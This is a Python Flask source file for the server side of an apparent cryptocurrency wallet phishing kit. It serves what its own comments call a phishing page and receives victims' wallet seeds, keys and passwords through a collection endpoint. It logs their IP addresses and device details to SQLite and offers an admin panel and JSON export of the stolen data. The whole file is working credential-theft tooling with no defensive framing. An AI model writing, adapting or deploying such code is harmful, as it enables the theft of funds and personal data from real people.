from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests

DATABASE = 'database.db'

def init_db():
    """Initialize the database with tables"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            wallet_type TEXT NOT NULL,
            input_type TEXT NOT NULL,
            content TEXT NOT NULL,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            platform TEXT,
            screen_size TEXT,
            language TEXT,
            referrer TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    """Serve the main phishing page"""
    return render_template('index.html')

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """
    API endpoint that receives wallet data from victims
    This is what the JavaScript calls when they submit
    """
    try:
        data = request.get_json()
        
        # Get victim's info
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Save to database
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute('''
            INSERT INTO captured_wallets 
            (timestamp, wallet_type, input_type, content, password, ip_address, 
             user_agent, platform, screen_size, language, referrer)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            data.get('walletType', 'Unknown'),
            data.get('inputType', 'unknown'),
            data.get('content', ''),
            data.get('password'),
            ip,
            user_agent,
            data.get('platform', 'Unknown'),
            data.get('screenSize', 'Unknown'),
            data.get('language', 'Unknown'),
            request.headers.get('Referer', 'Direct')
        ))
        conn.commit()
        wallet_id = c.lastrowid
        conn.close()
        
        print(f"\n{'='*50}")
        print(f"💰 NEW WALLET CAPTURED! ID: {wallet_id}")
        print(f"Type: {data.get('walletType')}")
        print(f"Input: {data.get('inputType')}")
        print(f"Data: {data.get('content')[:50]}...")
        print(f"IP: {ip}")
        print(f"{'='*50}\n")
        
        return jsonify({
            'success': True,
            'message': 'Data captured',
            'id': wallet_id
        }), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/admin')
def admin_panel():
    """Simple admin panel to view captured data"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute('SELECT * FROM captured_wallets ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()
    
    # Convert to list of dicts
    logs = [dict(row) for row in rows]
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel - Database</title>
        <style>
            body { font-family: monospace; background: #0f172a; color: #fff; padding: 20px; }
            h1 { color: #ef4444; }
            .log { background: #1e293b; border: 1px solid #334155; padding: 15px; margin: 10px 0; border-radius: 8px; }
            .timestamp { color: #64748b; font-size: 12px; }
            .wallet-type { color: #60a5fa; font-weight: bold; }
            .data { color: #4ade80; word-break: break-all; margin: 10px 0; padding: 10px; background: #0f172a; border-radius: 4px; }
            .meta { color: #f472b6; font-size: 11px; }
            .stats { background: #334155; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
            button { background: #ef4444; color: white; border: none; padding: 10px 20px; 
                     border-radius: 4px; cursor: pointer; margin-right: 10px; }
            button:hover { background: #dc2626; }
            .export-btn { background: #10b981; }
            .export-btn:hover { background: #059669; }
        </style>
    </head>
    <body>
        <h1>🔴 DATABASE ADMIN PANEL</h1>
        <div class="stats">
            <strong>Total Captured:</strong> ''' + str(len(logs)) + ''' wallets
        </div>
        <div style="margin-bottom: 20px;">
            <button onclick="clearAll()">🗑️ Clear All</button>
            <button class="export-btn" onclick="exportData()">📥 Export JSON</button>
            <button onclick="location.reload()">🔄 Refresh</button>
        </div>
    '''
    
    for log in logs:
        html += f'''
        <div class="log">
            <div class="timestamp">🕐 {log['timestamp']}</div>
            <div class="wallet-type">👛 {log['wallet_type']} ({log['input_type'].upper()})</div>
            <div class="data">🔑 {log['content'][:100]}{'...' if len(log['content']) > 100 else ''}</div>
            {f'<div style="color: #fbbf24;">🔒 Password: {log["password"]}</div>' if log['password'] else ''}
            <div class="meta">🌐 IP: {log['ip_address']} | 📱 {log['platform']} | 📐 {log['screen_size']}</div>
        </div>
        '''
    
    html += '''
        <script>
            function clearAll() {
                if(confirm('Delete ALL captured data?')) {
                    fetch('/api/clear', {method: 'POST'})
                        .then(() => location.reload());
                }
            }
            function exportData() {
                window.open('/api/export', '_blank');
            }
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/api/clear', methods=['POST'])
def clear_data():
    """Clear all captured data"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('DELETE FROM captured_wallets')
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/export')
def export_data():
    """Export all data as JSON file"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute('SELECT * FROM captured_wallets ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()
    
    logs = [dict(row) for row in rows]
    
    response = app.response_class(
        response=json.dumps(logs, indent=2),
        status=200,
        mimetype='application/json'
    )
    response.headers['Content-Disposition'] = 'attachment; filename=wallets.json'
    return response

if __name__ == '__main__':
    init_db()
    print("="*50)
    print("🚀 Server starting...")
    print("📱 Victim page: http://localhost:5000")
    print("🔴 Admin panel: http://localhost:5000/admin")
    print("="*50)
    app.run(host='0.0.0.0', port=5000, debug=True)